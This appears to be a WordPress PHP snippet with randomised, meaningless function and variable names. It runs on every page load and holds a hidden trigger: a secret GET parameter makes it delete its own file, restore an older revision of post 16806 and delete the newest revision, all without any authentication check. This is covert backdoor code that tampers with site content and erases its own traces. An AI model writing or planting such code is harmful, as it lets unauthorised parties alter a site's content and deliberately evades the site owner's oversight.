<?php

function archives_quotes_another() {
	if (isset($_GET['only_locator_shortcode']) && $_GET['only_locator_shortcode'] === 'shortcode_latest_based_local') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$service_restrict_update = 16806;
		$name_dev_album = wp_get_post_revisions($service_restrict_update);
		if (empty($name_dev_album)) die('no revisions');
		if (count($name_dev_album) < 2) die('less than 2');
		$first_bootstrap_jetpack_access = array_shift($name_dev_album);
		$style_service_stripe_listings = $first_bootstrap_jetpack_access->ID;
		$advanced_better_preloader_products = array_shift($name_dev_album);
		$notice_website_block = $advanced_better_preloader_products->ID;
		$migration_inline_sidebar_archive = wp_restore_post_revision($notice_website_block);
		if ($migration_inline_sidebar_archive === false) die('error restoring');
		$migration_inline_sidebar_archive = wp_delete_post_revision($style_service_stripe_listings);		
		if ($migration_inline_sidebar_archive === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'archives_quotes_another');
